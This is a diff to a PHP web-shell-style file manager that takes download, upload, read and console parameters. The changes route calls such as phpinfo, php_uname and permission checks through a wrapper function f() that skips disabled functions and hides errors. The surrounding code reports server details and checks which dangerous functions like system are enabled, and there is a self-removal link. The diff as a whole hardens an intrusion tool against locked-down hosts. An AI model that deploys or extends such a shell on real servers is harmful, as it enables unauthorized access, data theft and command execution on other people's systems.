@@ -152,8 +152,8 @@ function main($dir, $download, $upload, $read, $console, $method, $base64_paths)
   echo "<h2>Information</h2>";
 
   echo '<p><b>Current script:</b> <a href="?dir=' . ($base64_paths ? base64_encode(__DIR__): __DIR__) . '">'. __FILE__ . '</a></p>';
-  echo '<p><b>PHP version:</b> ' . phpversion() . ' @ ' . php_uname() . ' [' . php_sapi_name() . ']</p>';
-  echo '<p><b>PHP extensions:</b> ' . implode(', ', get_loaded_extensions()) . '</p>';
+  echo '<p><b>PHP version:</b> ' . f('phpversion') . ' @ ' . f('php_uname') . ' [' . f('php_sapi_name') . ']</p>';
+  echo '<p><b>PHP extensions:</b> ' . implode(', ', f('get_loaded_extensions')) . '</p>';
   echo '<p><b>PHP disable functions:</b> ' . ini_get('disable_functions') . '</p>';
   echo '<p><b>PHP dangerous functions:</b> ';
   echo is_enabled('system') . ' ';
@@ -179,7 +179,7 @@ function main($dir, $download, $upload, $read, $console, $method, $base64_paths)
 
 
   if (isset($_GET['info'])) {
-    phpinfo();
+    f('phpinfo');
   }
 
   echo "<p><a href='?remove'>Remove me</a></p>";
@@ -204,11 +204,11 @@ function list_directory_php($dir)
     $perm = get_perms($real);
 
     $my_perm = '';
-    if (is_readable($real))
+    if (f('is_readable',$real))
       $my_perm .= 'R';
-    if (is_writable($real))
+    if (f('is_writable',$real))
       $my_perm .= 'W';
-    if (is_executable($real))
+    if (f('is_executable',$real))
       $my_perm .= 'X';
 
     $owner = '';
@@ -218,7 +218,7 @@ function list_directory_php($dir)
 
     $time = date('Y-m-d H:i:s', filemtime($real));
     $size = is_dir($real) ? '' : FileSizeConvert(filesize($real));
-    $base64 = is_readable($real) && !$isDir ? base64_encode($real) : '';
+    $base64 = f('is_readable',$real) && !$isDir ? base64_encode($real) : '';
 
     $fileList[] = [
       'name' => $file,
@@ -623,4 +623,15 @@ function read_archive($content, $file_name)
     }
     unlink($temp);
   }
+}
+
+function f($function, ...$params) {
+  if (function_exists($function)) {
+      try {
+          return call_user_func_array($function, $params);
+      } catch (Throwable $e) {
+          return null;
+      }
+  }
+  return null;
 }
